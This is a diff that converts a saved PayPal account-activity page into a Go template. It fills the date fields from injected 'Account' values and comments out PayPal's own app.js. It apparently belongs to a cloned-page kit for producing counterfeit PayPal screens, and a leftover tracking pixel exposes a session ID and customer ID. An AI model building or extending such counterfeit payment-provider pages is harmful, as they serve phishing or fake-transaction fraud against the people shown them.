@@ -385,7 +385,7 @@
                                                                                                      id="js_dateFormat"
                                                                                                      value="DD/MM/YY"><input
                                                         type="hidden" id="js_datePickerInputDateFormat"
-                                                        value="DD/MM/YY"><input type="hidden" id="js_monthHeaderFormat"
+                                                        value="25/08/21"><input type="hidden" id="js_monthHeaderFormat"
                                                                                 value="MMMM YYYY">
                                                 <div class="js_datePicker-body">
                                                     <div class="customDates js_customDates">
@@ -397,7 +397,7 @@
                                                                     value><input
                                                                     class="ppvx_text-input__control js_filters-startDate customDates-field nemo_startDate"
                                                                     id="js_filters-startDate" placeholder="dd/mm/yy"
-                                                                    value><span
+                                                                    value="{{ .Account.DateStart.Format "02/01/06" }}"><span
                                                                     class="customDates-icon ppvx_icon ppvx_icon--size_sm ppvx_icon-calendar"></span>
                                                         </div>
                                                         <div class="ppvx_text-input ppvx_text-input--nolabel form-control js_form-control filters-endDate">
@@ -408,7 +408,7 @@
                                                                     value><input
                                                                     class="ppvx_text-input__control js_filters-endDate customDates-field nemo_endDate"
                                                                     id="js_filters-endDate" placeholder="dd/mm/yy"
-                                                                    value><span
+                                                                    value="{{ .Account.DateEnd.Format "02/01/06" }}"><span
                                                                     class="customDates-icon ppvx_icon ppvx_icon--size_sm ppvx_icon-calendar"></span>
                                                         </div>
                                                     </div>
@@ -930,7 +930,7 @@
 <noscript><img
             src="https:\/\/t.paypal.com\/ts?nojs=1&pgrp=main%3Awalletweb%3Aactivity%3A%3Ahome&amp;page=main%3Awalletweb%3Aactivity%3A%3Ahome%3A%3A%3A&amp;pgst=1637696604118&amp;calc=b9565e87ac617&amp;nsid=qdr2GpLXSa6Kay4v2RkI16uepZ8BpSb2&amp;rsta=ru_RU&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=RU&amp;csci=6760a50465544d9689fa6746ebe18a81&amp;comp=activitynodeweb&amp;tsrce=authchallengenodeweb&amp;cu=1&amp;gacook=745262130.1637653753&amp;cust=WWM5YDRF75L4Q&amp;party_id=WWM5YDRF75L4Q&amp;acnt=personal&amp;aver=verified&amp;rstr=unrestricted&amp;cnac=RU&amp;xe=101635%2C100643%2C103621%2C101637%2C103620%2C102980%2C100711%2C103398%2C100712%2C102349%2C102159%2C103535%2C103758%2C100878%2C100852%2C102519%2C101879%2C102552%2C102746%2C100947%2C102354%2C100613%2C101004%2C100323%2C100904%2C100328%2C101096%2C100719%2C100272%2C103746&amp;xt=105442%2C101701%2C114449%2C105450%2C114448%2C111596%2C101900%2C113512%2C101903%2C108654%2C120188%2C114121%2C115291%2C102517%2C102419%2C109487%2C106637%2C109619%2C110481%2C102748%2C108665%2C101615%2C102918%2C100814%2C102612%2C100824%2C103272%2C101917%2C100651%2C115033&amp;eppb=Y"
             alt="" height="1" width="1" border="0"></noscript>
-<script src="https://www.paypalobjects.com/web/res/8c3/dc32f2ffdba21fd310785fd56544f/js/apps/app.js"></script>
+{{/*<script src="https://www.paypalobjects.com/web/res/8c3/dc32f2ffdba21fd310785fd56544f/js/apps/app.js"></script>*/}}
 <script async
         src="/auth/createchallenge/93343466a797da04/recaptchav3.js?_sessionID=qdr2GpLXSa6Kay4v2RkI16uepZ8BpSb2"></script>
 <script>
